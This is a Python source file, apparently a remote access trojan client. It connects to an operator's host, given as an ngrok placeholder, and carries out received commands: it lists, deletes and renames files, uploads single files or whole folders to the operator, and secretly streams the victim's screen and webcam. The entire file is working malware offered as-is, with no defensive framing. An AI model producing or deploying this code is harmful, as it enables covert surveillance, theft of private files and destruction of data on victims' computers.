import socket
import math
import os
import threading
import time
from vidstream import ScreenShareClient
from vidstream import CameraClient

IP = "your ngrok link ip or ip or localhost"
PORT = 9099
ENCODE = "utf-8"
SIZE = 1024
COMMANDS = ['cd', 'ls', 'mdir', 'rvf', 'rvd', 'rm', 'gsize', 'cwd']
path = ""
paths_bank = []

def os_commands_processes(command):
    if command[0] == 'ls':
        data = os.listdir()
        data = '\n'.join(data)
    elif command[0] == 'cd':
        os.chdir(command[1])
        data = "Path changed successfully"
    elif command[0] == 'cwd':
        data = os.getcwd()
        data = f"path!{data}"
    elif command[0] == 'mdir':
        os.mkdir(command[1])
        data = f"{command[1]} created successfully"
    elif command[0] == 'rvf':
        os.remove(command[1])
        data = f"{command[1]} removed successfully"
    elif command[0] == 'rvd':
        os.rmdir(command[1])
        data = f"{command[1]} removed successfully"
    elif command[0] == 'rm':
        os.rename(command[1], command[2])
        data = f"{command[1]} renamed to {command[2]} successfully"
    elif command[0] == 'gsize':
        data = os.path.getsize(command[1])
        data = f"size!{data}"
    client.sendall(data.encode(ENCODE))
    client.recv(SIZE)

def extract_files(folder_name):
    global paths_bank
    files_and_folders = os.listdir(folder_name)
    for element in files_and_folders:
        if len(element.split('.')) == 1:
            extract_files(f"{folder_name}/{element}")
        else:
            if len(element.split(' ')) > 1:
                os.rename(f'{folder_name}/{element}', f"{folder_name}/{element.replace('', '-')}")
            paths_bank.append(f"{folder_name}/{element.replace('', '-')}")
    return paths_bank

def screen_record():
    sender = ScreenShareClient('your ngrok link ip or ip or localhost', 9876)   
    sender.start_stream()

def camera_record():
    senderCamera = CameraClient('your ngrok link ip or ip or localhost', 9909)   
    senderCamera.start_stream()

def upload(file_name, multi=False):
    all_files = [file_name]
    if multi:
        all_files = extract_files(file_name)
    client.sendall(' '.join(all_files).encode(ENCODE))
    client.recv(SIZE)

    for file_name in all_files:
        with open(f"{file_name}", '+rb') as file:
            file_data = file.read()
            chunks_num = math.ceil(len(file_data) / SIZE)
            client.sendall(str(chunks_num).encode(ENCODE))
            client.recv(SIZE)  
            
            for idx in range(0, len(file_data), SIZE):
                client.sendall(file_data[idx: idx + SIZE])
                client.recv(SIZE)  

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
    client.connect((IP, PORT))

    while True:
        command = client.recv(SIZE).decode(ENCODE)
        command = command.split(' ')
        if command[0] == 'download':
            upload(command[1], multi=len(command[1].split('.')) == 1)
        elif command[0]in COMMANDS:
            os_commands_processes(command)
        elif command[0] == 'screen':
            thread = threading.Thread(target=screen_record)
            thread.start()
        elif command[0] == 'camera':
            thread = threading.Thread(target=camera_record)
            thread.start()
        client.sendall("Done!".encode(ENCODE))